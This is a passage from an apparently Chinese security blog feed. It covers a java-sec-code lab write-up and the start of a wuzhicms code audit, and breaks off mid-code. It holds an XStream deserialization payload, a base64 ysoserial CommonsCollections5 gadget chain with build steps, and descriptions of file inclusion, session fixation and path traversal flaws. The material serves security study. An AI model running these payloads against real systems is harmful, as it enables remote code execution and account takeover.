</span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=629E8EB9997DA26781472C6FFCAF7454; XSRF-TOKEN=f6390ed7-0e1c-4fbe-a342-1177716a0983; remember-me=YWRtaW46MTc1NDgwMTUzMDEzMTowZDM3ZjcxZDFmODc2YmUyNDQ0NGY3MmZkYTFkY2NmMQ<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>439<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">sorted-set</span>&gt;</span>  </span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span> <span class="hljs-comment">&lt;!-- --&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>cmd<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">sorted-set</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080947651.png" alt="20250727132402482"></p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p>java经典反序列化漏洞复现</p><p><a href="https://www.cnblogs.com/0kooo-yz/p/18399516">https://www.cnblogs.com/0kooo-yz/p/18399516</a></p><p>代码审计入门之java-sec-code（一）</p><p><a href="https://www.freebuf.com/articles/web/289863.html">https://www.freebuf.com/articles/web/289863.html</a></p><p>Java-Sec代码审计漏洞篇(一)</p><p><a href="https://xz.aliyun.com/news/15669">https://xz.aliyun.com/news/15669</a></p><p>Java-Sec代码审计漏洞篇(二)</p><p><a href="https://xz.aliyun.com/news/15721">https://xz.aliyun.com/news/15721</a></p><p>Java-sec-code靶场分析练习</p><p><a href="https://buaq.net/go-307106.html">https://buaq.net/go-307106.html</a></p><p>java-sec-code 靶场复现</p><p><a href="https://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/">https://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/</a></p><p>SnakeYaml反序列化漏洞研究</p><p><a href="https://www.cnblogs.com/LittleHann/p/17828948.html">https://www.cnblogs.com/LittleHann/p/17828948.html</a></p><p>跨域资源共享 CORS 详解</p><p><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p><p>初识HTTP响应拆分攻击（CRLF Injection）</p><p><a href="https://www.anquanke.com/post/id/240014">https://www.anquanke.com/post/id/240014</a></p><p>CSRF漏洞原理攻击与防御（非常细）-CSDN博客</p><p><a href="https://blog.csdn.net/qq_43378996/article/details/123910614">https://blog.csdn.net/qq_43378996/article/details/123910614</a></p><p>JSONP 跨域原理及实现</p><p><a href="https://segmentfault.com/a/1190000041946934">https://segmentfault.com/a/1190000041946934</a></p><p> PostgreSQL JDBC 驱动远程代码执行漏洞（CVE-2022-21724）</p><p><a href="https://avd.aliyun.com/detail?id=AVD-2022-21724&timestamp__1384=eqA27KD5BKAK4YqGNDQRhMiKvr+mCnCoD">https://avd.aliyun.com/detail?id=AVD-2022-21724&amp;timestamp__1384=eqA27KD5BKAK4YqGNDQRhMiKvr%2BmCnCoD</a></p><p>PreparedStatement的使用</p><p><a href="https://www.cnblogs.com/ysw-go/p/5459330.html">https://www.cnblogs.com/ysw-go/p/5459330.html</a></p><p>路径穿越（Path Traversal）详解-CSDN博客</p><p><a href="https://blog.csdn.net/qingzhantianxia/article/details/128204437">https://blog.csdn.net/qingzhantianxia/article/details/128204437</a></p><p>SSTI（模板注入）漏洞（入门篇）</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p>SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客</p><p><a href="https://blog.csdn.net/qq_43378996/article/details/124050308">https://blog.csdn.net/qq_43378996/article/details/124050308</a></p><p>由浅入深SpEL表达式注入漏洞</p><p><a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a></p><p>XXE漏洞原理、检测与修复</p><p><a href="https://www.cnblogs.com/mysticbinary/p/12668547.html">https://www.cnblogs.com/mysticbinary/p/12668547.html</a></p><p>从XML相关一步一步到XXE漏洞</p><p><a href="https://xz.aliyun.com/news/6483">https://xz.aliyun.com/news/6483</a></p><p>CVE-2020-26217 | XStream远程代码执行漏洞 </p><p><a href="https://www.cnblogs.com/303donatello/p/13998245.html">https://www.cnblogs.com/303donatello/p/13998245.html</a></p><h1 id="工具的安装-使用"><a href="#工具的安装-使用" class="headerlink" title="工具的安装&amp;使用"></a>工具的安装&amp;使用</h1><h2 id="ysoserial-jar"><a href="#ysoserial-jar" class="headerlink" title="ysoserial.jar"></a>ysoserial.jar</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linux：<br><br>检查Java版本：<br>java -version<br>若未安装：<br><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install openjdk-8-jdk-headless<br><br>安装 Git 和 Maven<br><span class="hljs-built_in">sudo</span> apt install git maven -y<br><br>拉取源码<br>git <span class="hljs-built_in">clone</span> https://github.com/frohoff/ysoserial.git<br><br>编译<br><span class="hljs-built_in">cd</span> ysoserial<br>mvn clean package -DskipTests<br><br>编译后所在文件夹<br><span class="hljs-built_in">cd</span> target/ysoserial-0.0.6-SNAPSHOT-all.jar <br><br>重命名<br><span class="hljs-built_in">cp</span> target/ysoserial-*-all.jar ~/ysoserial.jar<br><br>测试是否安装成功<br>java -jar ysoserial.jar<br><br>生成payload<br>calcWindows 内置命令<br><span class="hljs-string">&quot;gnome-calculator&quot;</span>Linux + GUI + 有此命令<br><span class="hljs-string">&quot;open -a Calculator&quot;</span>macOS + 图形环境<br><br>Windows：<br><br>java -jar ~/ysoserial.jar CommonsCollections5 calc | <span class="hljs-built_in">base64</span><br><br>rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wuzhicms 代码审计</title>
    <link href="/2025/07/20/wuzhicms/"/>
    <url>/2025/07/20/wuzhicms/</url>
    
    <content type="html"><![CDATA[<h1 id="wuzhicms-代码审计"><a href="#wuzhicms-代码审计" class="headerlink" title="wuzhicms 代码审计"></a>wuzhicms 代码审计</h1><h1 id="根目录分析"><a href="#根目录分析" class="headerlink" title="根目录分析"></a>根目录分析</h1><p>apiAPI接口，找未授权、SQL注入<br>caches 缓存目录<br>configs配置文件<br>coreframe框架核心代码<br>install安装目录，安装后应删除<br>map<br>promote<br>res静态资源<br>uploadfile上传文件储存目录，文件上传漏洞</p><h1 id="分析代码-参考README-md"><a href="#分析代码-参考README-md" class="headerlink" title="分析代码(参考README.md)"></a>分析代码(参考README.md)</h1><p>程序模块结构说明</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">|<span class="hljs-string">-- coreframe                   #框架目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- app                     #模块（应用程序）目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- affiche             #公告模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- appshop             #应用商城</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- attachment          #附件模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- collect             #采集器</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- content             #内容模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- core                #核心模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- coupon              #优惠券模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- credit              #积分模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- database            #数据库模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- dianping            #点评模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- guestbook           #留言板模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- link                #友情链接模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- linkage             #联动菜单</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- member              #会员模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- message             #站内短信模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- mobile              #移动手机模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- order               #订单模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- pay                 #支付模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- ppc                 #推广模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- receipt             #发票申请模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- search              #全站搜索模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- sms                 #短信模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- tags                #tags模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   --- template            #在线模板编辑</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- configs                 #框架配置</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- core.php                #框架入口</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- crontab                 #定时脚本目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- crontab.php             #定时脚本入口</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- extend                  #扩展目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- languages               #语言包</span><br><span class="hljs-string"></span>|<span class="hljs-string">   --- templates               #模板</span><br><span class="hljs-string"></span>|<span class="hljs-string">-- caches                      #缓存目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- _cache_                 #公共缓存</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- block                   #区块、碎片缓存</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- content                 #内容模块缓存，栏目缓存</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- db_bak                  #数据库备份路径</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- install.check           #安装锁定</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- model                   #模型缓存</span><br><span class="hljs-string"></span>|<span class="hljs-string">   --- templates               #模板缓存</span><br><span class="hljs-string">--- www                         #网站根目录</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- 404.html                #404页面</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- admin.php               #后台入口</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- api                     #api目录</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- configs                 #网站配置</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- favicon.ico             #浏览器icon</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- index.html              #网站首页</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- index.php               #动态地址首页</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- res                     #静态资源</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- robots.txt              #搜索引擎防抓取规则</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- uploadfile              #附件</span><br><span class="hljs-string">    `-- web.php                 #自定义路由</span><br></code></pre></td></tr></table></figure><h2 id="app-模块（应用程序）目录"><a href="#app-模块（应用程序）目录" class="headerlink" title="app&#x2F; #模块（应用程序）目录"></a>app&#x2F; #模块（应用程序）目录</h2><p>先去核心模块看</p><h3 id="coreframe-app-core-admin-index-php后台登录首页"><a href="#coreframe-app-core-admin-index-php后台登录首页" class="headerlink" title="coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;index.php后台登录首页"></a>coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;index.php后台登录首页</h3><p>因为没有对$lang进行检验和过滤，通过设置cookie值，对require的路径拼接，使require执行任何PHP文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$lang</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) ? <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) : LANG;<br><span class="hljs-keyword">require</span> COREFRAME_ROOT.<span class="hljs-string">&#x27;languages/&#x27;</span>.<span class="hljs-variable">$lang</span>.<span class="hljs-string">&#x27;/admin_menu.lang.php&#x27;</span>;<br>        <br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">left</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$lang</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) ? <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) : LANG;<br><span class="hljs-keyword">require</span> COREFRAME_ROOT.<span class="hljs-string">&#x27;languages/&#x27;</span>.<span class="hljs-variable">$lang</span>.<span class="hljs-string">&#x27;/admin_menu.lang.php&#x27;</span>;              <br></code></pre></td></tr></table></figure><p>此处是ai发现的一个漏洞，实际上很难触发，记录：</p><ol><li>登录成功后不生成新session ID</li><li>直接重用攻击者提供的session ID</li></ol><p>利用：</p><ol><li>攻击者获取自己的session ID：<code>PHPSESSID=attacker_sess</code></li><li>构造钓鱼链接：</li></ol><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://target.com/admin/?m=core&amp;f=index&amp;v=login&amp;submit=1&amp;checkcode=...</span>[<span class="hljs-string">有效验证码</span>]...&amp;username=admin&amp;password=123456<br></code></pre></td></tr></table></figure><ol><li>诱使管理员点击链接（含攻击者的session ID）</li><li>管理员登录后，攻击者使用相同的<code>PHPSESSID</code>即可直接进入管理员账户</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//登录</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//已经登陆的用户重定向到后台首页</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;already login&#x27;</span>), <span class="hljs-string">&#x27;?m=core&amp;f=index&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">su</span>(<span class="hljs-number">0</span>));<br>        &#125;<br>...<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>暴露敏感信息：当然，需要登录到后台才能利用，所以不算高危。</p><p>路由：</p><p><code>http://wuzhicms:7575/index.php?m=core&amp;f=index&amp;_su=wuzhicms&amp;v=phpinfo</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 显示 phpinfo 内容</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">phpinfo</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080954694.png" alt="20250717125939730"></p><h3 id="coreframe-app-appupdate-admin-index-php"><a href="#coreframe-app-appupdate-admin-index-php" class="headerlink" title="coreframe&#x2F;app&#x2F;appupdate&#x2F;admin&#x2F;index.php"></a>coreframe&#x2F;app&#x2F;appupdate&#x2F;admin&#x2F;index.php</h3><p>如果 $filePath 为 ..&#x2F;..&#x2F;..&#x2F;index.php，则 COREFRAME_ROOT . ‘..&#x2F;..&#x2F;..&#x2F;index.php’ 就可以指向系统目录外的敏感文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_deleteFilesForPackageUpdate</span>(<span class="hljs-params"><span class="hljs-variable">$packageDir</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">exists</span>(<span class="hljs-variable">$packageDir</span>.<span class="hljs-string">&#x27;/delete&#x27;</span>)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span 